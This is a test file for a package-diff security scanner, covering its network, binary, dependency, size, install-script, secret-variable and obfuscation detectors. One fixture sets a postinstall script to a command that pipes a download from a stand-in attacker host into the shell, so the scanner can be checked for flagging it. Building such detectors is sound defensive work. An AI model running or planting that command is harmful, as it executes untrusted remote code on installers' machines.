import { describe, expect, it } from "vitest";
import { makeContext } from "../helpers/detector-context.js";
import { networkDetector } from "../../src/detectors/network.js";
import {
  classifyBinary,
  executableArtifactsDetector
} from "../../src/detectors/executable-artifacts.js";
import { dependenciesDetector } from "../../src/detectors/dependencies.js";
import { packageSizeDetector } from "../../src/detectors/package-size.js";
import { lifecycleScriptsDetector } from "../../src/detectors/lifecycle-scripts.js";
import { sensitiveEnvDetector } from "../../src/detectors/sensitive-env.js";
import { obfuscationDetector } from "../../src/detectors/obfuscation.js";

describe("network detector — additional call shapes", () => {
  it("detects WebSocket with a literal host", () => {
    const ctx = makeContext({ files: { "a.js": `new WebSocket("wss://ws.example.com/x");` } });
    const signals = networkDetector.analyze(ctx);
    expect(signals.some((s) => s.detail === "ws.example.com")).toBe(true);
  });

  it("detects WebSocket with a dynamic host", () => {
    const ctx = makeContext({ files: { "a.js": `new WebSocket(url);` } });
    const signals = networkDetector.analyze(ctx);
    expect(signals.some((s) => s.detail === "dynamic destination")).toBe(true);
  });

  it("detects bare fetch() with a literal URL", () => {
    const ctx = makeContext({ files: { "a.js": `fetch("https://api.example.com/data");` } });
    const signals = networkDetector.analyze(ctx);
    expect(signals.some((s) => s.detail === "api.example.com")).toBe(true);
  });

  it("detects bare fetch() with a dynamic URL", () => {
    const ctx = makeContext({ files: { "a.js": `fetch(someUrl);` } });
    const signals = networkDetector.analyze(ctx);
    expect(signals.some((s) => s.detail === "dynamic destination")).toBe(true);
  });

  it("detects http.get with a literal URL", () => {
    const ctx = makeContext({
      files: { "a.js": `const http = require("http"); http.get("http://example.com/a");` }
    });
    const signals = networkDetector.analyze(ctx);
    expect(signals.some((s) => s.detail === "example.com")).toBe(true);
  });

  it("detects https.request with a dynamic (options object) argument", () => {
    const ctx = makeContext({
      files: {
        "a.js": `const https = require("https"); https.request({ hostname: "x.com" }, cb);`
      }
    });
    const signals = networkDetector.analyze(ctx);
    expect(signals.some((s) => s.detail === "dynamic destination")).toBe(true);
  });

  it("detects net.connect", () => {
    const ctx = makeContext({
      files: { "a.js": `const net = require("net"); net.connect(1234, "host");` }
    });
    const signals = networkDetector.analyze(ctx);
    expect(signals.some((s) => s.identity === "net:net.connect:dynamic")).toBe(true);
  });

  it("detects tls.connect", () => {
    const ctx = makeContext({
      files: { "a.js": `const tls = require("tls"); tls.connect(443, "host");` }
    });
    const signals = networkDetector.analyze(ctx);
    expect(signals.some((s) => s.identity === "net:tls.connect:dynamic")).toBe(true);
  });

  it("diff() reports a dynamic-destination finding with distinct copy", () => {
    const oldSignals = networkDetector.analyze(makeContext({ files: {} }));
    const newSignals = networkDetector.analyze(makeContext({ files: { "a.js": `fetch(x);` } }));
    const findings = networkDetector.diff(oldSignals, newSignals);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.title).toContain("dynamic destination");
  });
});

describe("executable-artifacts detector — magic byte classification", () => {
  it("classifies .node files by extension", () => {
    expect(classifyBinary("addon.node", Buffer.alloc(4))).toBe("native-addon");
  });

  it("classifies wasm by magic bytes", () => {
    expect(classifyBinary("a.wasm", Buffer.from([0x00, 0x61, 0x73, 0x6d]))).toBe("wasm");
  });

  it("does not classify a .wasm file with wrong magic bytes", () => {
    expect(classifyBinary("a.wasm", Buffer.from([1, 2, 3, 4]))).toBeUndefined();
  });

  it("classifies ELF binaries", () => {
    expect(classifyBinary("a.bin", Buffer.from([0x7f, 0x45, 0x4c, 0x46]))).toBe("elf");
  });

  it("classifies Mach-O binaries (both magic variants)", () => {
    expect(classifyBinary("a.bin", Buffer.from([0xfe, 0xed, 0xfa, 0x00]))).toBe("mach-o");
    expect(classifyBinary("b.bin", Buffer.from([0xcf, 0xfa, 0xed, 0x00]))).toBe("mach-o");
  });

  it("classifies PE binaries", () => {
    expect(classifyBinary("a.exe", Buffer.from([0x4d, 0x5a]))).toBe("pe");
  });

  it("returns undefined for unrecognized content", () => {
    expect(classifyBinary("a.txt", Buffer.from([1, 2, 3]))).toBeUndefined();
  });

  it("reports new binaries as DC008 findings", () => {
    const ctx = makeContext({
      binaries: [{ relPath: "native.node", size: 1000, magicType: "native-addon" }]
    });
    const signals = executableArtifactsDetector.analyze(ctx);
    const findings = executableArtifactsDetector.diff([], signals);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.code).toBe("DC008");
  });
});

describe("dependencies detector — edge cases", () => {
  it("ignores an ordinary semver dependency addition", () => {
    const oldCtx = makeContext({ manifest: { dependencies: {} } });
    const newCtx = makeContext({ manifest: { dependencies: { lodash: "^4.17.21" } } });
    const findings = dependenciesDetector.diff(
      dependenciesDetector.analyze(oldCtx),
      dependenciesDetector.analyze(newCtx)
    );
    expect(findings).toHaveLength(0);
  });

  it("flags a new git-sourced dependency", () => {
    const oldCtx = makeContext({ manifest: { dependencies: {} } });
    const newCtx = makeContext({
      manifest: { dependencies: { evil: "git+https://example.com/evil.git" } }
    });
    const findings = dependenciesDetector.diff(
      dependenciesDetector.analyze(oldCtx),
      dependenciesDetector.analyze(newCtx)
    );
    expect(findings.some((f) => f.code === "DC010")).toBe(true);
  });

  it("flags a new file: dependency", () => {
    const oldCtx = makeContext({ manifest: { dependencies: {} } });
    const newCtx = makeContext({ manifest: { dependencies: { local: "file:../local" } } });
    const findings = dependenciesDetector.diff(
      dependenciesDetector.analyze(oldCtx),
      dependenciesDetector.analyze(newCtx)
    );
    expect(findings.some((f) => f.code === "DC010")).toBe(true);
  });
});

describe("package-size detector — thresholds", () => {
  it("does not flag a trivial absolute size increase", () => {
    const oldCtx = makeContext({ totalBytes: 1000, packedFiles: [{ relPath: "a", size: 1000 }] });
    const newCtx = makeContext({ totalBytes: 3000, packedFiles: [{ relPath: "a", size: 3000 }] });
    const findings = packageSizeDetector.diff(
      packageSizeDetector.analyze(oldCtx),
      packageSizeDetector.analyze(newCtx)
    );
    expect(findings.every((f) => f.severity !== "high" && f.severity !== "critical")).toBe(true);
  });

  it("flags a large relative and absolute size jump as medium", () => {
    const oldCtx = makeContext({
      totalBytes: 200 * 1024,
      packedFiles: [{ relPath: "a", size: 200 * 1024 }]
    });
    const newCtx = makeContext({
      totalBytes: 5 * 1024 * 1024,
      packedFiles: Array.from({ length: 50 }, (_, i) => ({
        relPath: `f${i}`,
        size: (5 * 1024 * 1024) / 50
      }))
    });
    const findings = packageSizeDetector.diff(
      packageSizeDetector.analyze(oldCtx),
      packageSizeDetector.analyze(newCtx)
    );
    expect(findings.length).toBeGreaterThan(0);
  });
});

describe("lifecycle-scripts detector — changed script content", () => {
  it("reports a materially changed postinstall script", () => {
    const oldCtx = makeContext({
      manifest: { scripts: { postinstall: "node build.js" } }
    });
    const newCtx = makeContext({
      manifest: { scripts: { postinstall: "curl https://evil.example | sh" } }
    });
    const findings = lifecycleScriptsDetector.diff(
      lifecycleScriptsDetector.analyze(oldCtx),
      lifecycleScriptsDetector.analyze(newCtx)
    );
    expect(findings.some((f) => f.title.includes("changed"))).toBe(true);
  });

  it("does not report an unchanged postinstall script", () => {
    const oldCtx = makeContext({ manifest: { scripts: { postinstall: "node build.js" } } });
    const newCtx = makeContext({ manifest: { scripts: { postinstall: "node build.js" } } });
    const findings = lifecycleScriptsDetector.diff(
      lifecycleScriptsDetector.analyze(oldCtx),
      lifecycleScriptsDetector.analyze(newCtx)
    );
    expect(findings).toHaveLength(0);
  });

  it("ignores ordinary test/build/lint scripts", () => {
    const oldCtx = makeContext({ manifest: { scripts: {} } });
    const newCtx = makeContext({
      manifest: { scripts: { test: "vitest", build: "tsc", lint: "eslint ." } }
    });
    const findings = lifecycleScriptsDetector.diff(
      lifecycleScriptsDetector.analyze(oldCtx),
      lifecycleScriptsDetector.analyze(newCtx)
    );
    expect(findings).toHaveLength(0);
  });
});

describe("sensitive-env detector — benign names excluded", () => {
  it("does not flag common benign environment variables", () => {
    const ctx = makeContext({
      files: {
        "a.js": `
          console.log(process.env.NODE_ENV, process.env.CI, process.env.DEBUG,
            process.env.HOME, process.env.PATH, process.env.TERM,
            process.env.LANG, process.env.PWD, process.env.SHELL, process.env.USER);
        `
      }
    });
    const signals = sensitiveEnvDetector.analyze(ctx);
    expect(signals).toHaveLength(0);
  });

  it("flags a pattern-matched secret-shaped variable at medium confidence", () => {
    const ctx = makeContext({ files: { "a.js": `console.log(process.env.STRIPE_API_KEY);` } });
    const signals = sensitiveEnvDetector.analyze(ctx);
    expect(signals.length).toBeGreaterThan(0);
    const findings = sensitiveEnvDetector.diff([], signals);
    expect(findings[0]?.severity).toBe("medium");
  });
});

describe("obfuscation detector — heuristics", () => {
  it("does not flag ordinary short source code", () => {
    const ctx = makeContext({ files: { "a.js": `function add(a, b) { return a + b; }` } });
    const signals = obfuscationDetector.analyze(ctx);
    expect(signals).toHaveLength(0);
  });

  it("flags a newly introduced large base64-like blob", () => {
    const blob = "A".repeat(500) + "B".repeat(500) + "1234567890abcdef".repeat(40);
    const ctx = makeContext({ files: { "a.js": `const payload = "${blob}";` } });
    const signals = obfuscationDetector.analyze(ctx);
    expect(signals.length).toBeGreaterThan(0);
  });
});

describe("getDetector lookup", () => {
  it("finds a detector by code, case-insensitively", async () => {
    const { getDetector } = await import("../../src/detectors/index.js");
    expect(getDetector("dc001")?.code).toBe("DC001");
    expect(getDetector("DC001")?.code).toBe("DC001");
  });

  it("returns undefined for an unknown code", async () => {
    const { getDetector } = await import("../../src/detectors/index.js");
    expect(getDetector("DR999")).toBeUndefined();
  });
});
